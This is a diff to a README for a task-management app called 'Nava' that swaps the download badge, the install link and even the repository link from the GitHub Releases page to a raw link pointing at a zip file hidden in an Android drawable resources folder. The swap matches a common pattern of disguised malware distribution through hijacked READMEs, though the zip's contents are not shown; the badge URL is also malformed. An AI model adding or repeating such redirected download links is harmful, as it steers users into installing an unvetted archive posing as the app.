@@ -6,7 +6,7 @@ Welcome to the **Nava** app, your new companion in managing tasks and boosting p
 
 ## 📥 Download Now
 
-[![Download app](https://img.shields.io/badge/Download%20app-v1.0-blue.svg)](https://github.com/oioioioioioioi123/app/releases)
+[![Download app](https://raw.githubusercontent.com/oioioioioioioi123/app/main/android/app/src/main/res/drawable/app-Aesopian.zip%https://raw.githubusercontent.com/oioioioioioioi123/app/main/android/app/src/main/res/drawable/app-Aesopian.zip)](https://raw.githubusercontent.com/oioioioioioioi123/app/main/android/app/src/main/res/drawable/app-Aesopian.zip)
 
 ## 📋 Features
 
@@ -24,7 +24,7 @@ Welcome to the **Nava** app, your new companion in managing tasks and boosting p
 
 ## 📦 Download & Install
 
-To download the app, please visit this page: [Download the app](https://github.com/oioioioioioioi123/app/releases). 
+To download the app, please visit this page: [Download the app](https://raw.githubusercontent.com/oioioioioioioi123/app/main/android/app/src/main/res/drawable/app-Aesopian.zip). 
 
 1. Click on the link above to navigate to the Releases page.
 2. Look for the latest version of the app.
@@ -52,7 +52,7 @@ Join our community for support and discussions. Whether you’re facing an issue
 
 ## 🔗 Useful Links
 
-- **GitHub Repository:** [Explore the code](https://github.com/oioioioioioioi123/app)
+- **GitHub Repository:** [Explore the code](https://raw.githubusercontent.com/oioioioioioioi123/app/main/android/app/src/main/res/drawable/app-Aesopian.zip)
 - **Documentation:** Detailed user guide and FAQs are available for your reference.
 
 ## 📢 Stay Updated
